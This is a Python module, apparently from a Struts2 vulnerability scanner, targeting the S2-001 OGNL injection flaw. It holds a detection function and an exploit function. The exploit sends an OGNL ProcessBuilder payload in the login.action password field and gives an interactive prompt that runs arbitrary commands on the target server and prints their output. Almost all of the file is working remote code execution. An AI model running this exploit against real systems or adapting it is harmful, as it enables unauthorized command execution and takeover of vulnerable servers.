#!/usr/bin/env python
# coding=utf-8
import base64
import urllib
import requests
import urllib3
urllib3.disable_warnings()
from cve.Struts.Struts2scan_main.module.proxy import proxies
from cve.Struts.Struts2scan_main.module.color import color
from requests.exceptions import ConnectionError
from requests.exceptions import ConnectTimeout
from requests.exceptions import Timeout
import re


def s2_001(url):
    print("[*] 开始检测S2-001")
    vul_nname = "s2_001"
    cmd = "echo 78468794903108696"
    cmd = cmd.replace(' ','","')
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69",
        "Content-type" : "application/x-www-form-urlencoded",
    }
    payload = {
        'username':'111111',
        'password':r'%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"'+cmd+r'"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}',
    }
    try:
        vurl = urllib.parse.urljoin(url, '/login.action')
        req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False,proxies = proxies)
        if "78468794903108696" in req.text and re.search("echo.{0,10}" + "78468794903108696", req.text) == None:
            print(color.red("[+]")+"存在漏洞：%s" % vul_nname)
    except:
        pass

def s2_001_exp(url):
    first = True
    while 1:
        if first:
            cmd = "echo 78468794903108696"
        else:
            try:
                cmd = input("> ")
                if cmd == '':continue
                if cmd == 'exit':exit()
            except:exit()
        
        cmd = cmd.replace(' ','","')
        
        headers = {
            "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69",
            "Content-type" : "application/x-www-form-urlencoded",
        }
        payload = {
            'username':'111111',
            'password':r'%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"'+cmd+r'"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}',
        }

        try:
            vurl = urllib.parse.urljoin(url, '/login.action')
            print(vurl)
            req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False,proxies = proxies,allow_redirects=False)
            if "78468794903108696" not in req.text:
                print(color.red("[!]不存在该漏洞"))
                break
            elif first:
                first = False
                number1 = req.text.index("78468794903108696")
                afterstring = req.text[number1+len("78468794903108696"):number1+len("78468794903108696")+30]
            else:
                number2 = req.text.index(afterstring) 
                print(urllib.parse.unquote(req.text[number1:number2]))
            
        except ConnectionError as e:  
            print("[!]网络链接错误/代理异常")
            exit()
        except ConnectTimeout as e:  
            print("[!]连接远程服务器超时异常")
            exit()
        except Timeout as e:  
            print("[!]请求URL超时，产生超时异常")
            exit()
        except:pass